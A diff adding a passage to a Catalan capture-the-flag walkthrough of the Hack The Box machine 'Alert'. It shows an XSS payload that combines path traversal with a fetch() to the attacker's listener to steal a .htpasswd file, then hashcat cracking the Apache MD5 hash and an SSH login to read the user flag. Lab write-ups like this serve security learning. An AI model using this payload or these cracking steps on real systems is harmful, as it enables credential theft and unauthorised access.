@@ -405,3 +405,163 @@ Amb un string que hem de desxifrar amb URL encode, per exemple: https://www.urld
 
 Ara mateix estic aquí en aquesta fase, i em tocarà fer vàries proves de quins fitxers puc llegir/obtenir el seu contingut amb aquest mètode, però almenys ja estem obtenint una resposta i la podem llegir amb l'URL decoder.
 
+Després de vàries proves, he vist que com que el subdomini statistics.alert.htb té l'accés protegit amb autenticació podríem mirar de trobar un usuari i passwd per poder-hi accedir treient l'informació del fitxer .htpasswd que és un fitxer associat a Apache (tot i que no només es limita a l'Apache) i que s'utilitza principalment per gestionar l'autenticació HTTP bàsica (que és la que hem vist que té aquest subdomini). Per tant, amb el payload que tenim intentarem extreure la informació d'aquest fitxer per obtenir les credencials d'usuari que ens permetin accedir al subdomini statistics.
+
+Ara, després de vàris intents, amb el payload modificat de la següent forma:
+
+
+````
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.192:4444/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+````
+
+He obtingut les credencials de l'usuari que pot accedir al subdomini statistics.alert.htb:
+
+![image](https://github.com/user-attachments/assets/89b518e3-5807-467a-bada-363f125d7e56)
+
+````
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.14.192 - - [07/Dec/2024 12:12:56] "GET /?file_content=%0A HTTP/1.1" 200 -
+10.10.11.44 - - [07/Dec/2024 12:13:13] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
+````
+
+Aquestes credencials obtingudes però tenen la passwd de l'usuari hashejades i amb salt, ara, haurem de veure quin tipus de hash és i trencar-lo amb john the ripper, l'usuari, per altra banda, ja sabem que es albert:
+````
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</pre>
+````
+
+Li he preguntat al ChatGPT quin tipus de hash és, i ha dit que és un hash generat amb MD5 Apache Modular ($apr1$), que és un format utilitzat per Apache per a les contrasenyes al fitxer .htpasswd i que aquest format és conegut com a MD5-based password hash, específicament Apache MD5 crypt. Per tant, ara ja podem amb John the ripper o hashcat desxifrar el hash amb més facilitat al saber que és un MD5. 
+
+Ho he fet amb hashcat amb la opció ``-m 1600`` on -m és per especificar el tipus de hash i el 1600 que és per el tipus de hash que hem trobat: ``1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)``    
+
+````
+                                                                                                                                
+┌──(kali㉿kali)-[~/Documents/Alert]
+└─$ hashcat -m 1600 albert_hash.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 1603/3270 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 2 secs
+
+$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited    
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+Time.Started.....: Sat Dec  7 12:26:38 2024 (1 sec)
+Time.Estimated...: Sat Dec  7 12:26:39 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     6826 H/s (10.89ms) @ Accel:64 Loops:1000 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2880/14344385 (0.02%)
+Rejected.........: 0/2880 (0.00%)
+Restore.Point....: 2688/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
+Candidate.Engine.: Device Generator
+Candidates.#1....: my3kids -> soccer9
+Hardware.Mon.#1..: Util: 93%
+
+Started: Sat Dec  7 12:26:04 2024
+Stopped: Sat Dec  7 12:26:41 2024
+
+````
+
+Ara que ja tenim les credencials, provarem d'accedir al subdomini statistics.alert.htb
+
+![image](https://github.com/user-attachments/assets/e830ebb6-d33e-46b3-93a6-0335f1b14b0a)
+
+Veiem que el que hi ha és un dashboard amb estadístiques de les donacions que han fet els usuaris per mes i per top 10 d'usuaris amb el seu correu:
+
+![image](https://github.com/user-attachments/assets/be23a826-673f-4633-93aa-09a9400f7e78)
+
+Ara, com que al principi de tot al fer l'escaneig de ports amb nmap hem vist que hi ha el port 22 obert que és el port ssh per defecte, mirarem de connectarnos-hi a veure si així podem obtenir l'user flag:
+
+````
+                                                                                                                                
+┌──(kali㉿kali)-[~/Documents/Alert]
+└─$ ssh albert@10.10.11.44                                  
+The authenticity of host '10.10.11.44 (10.10.11.44)' can't be established.
+ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.44' (ED25519) to the list of known hosts.
+albert@10.10.11.44's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 07 Dec 2024 11:37:53 AM UTC
+
+  System load:  0.0               Processes:             257
+  Usage of /:   66.5% of 5.03GB   Users logged in:       1
+  Memory usage: 14%               IPv4 address for eth0: 10.10.11.44
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Dec  7 10:49:38 2024 from 10.10.14.24
+albert@alert:~$ pwd
+/home/albert
+albert@alert:~$ cat user.txt 
+e469507ec129a8838c1c8ea336ca93e3
+````
+
+Ara, haurem d'escalar privilegis per obtenir la flag de l'usuari root.
+
+
+
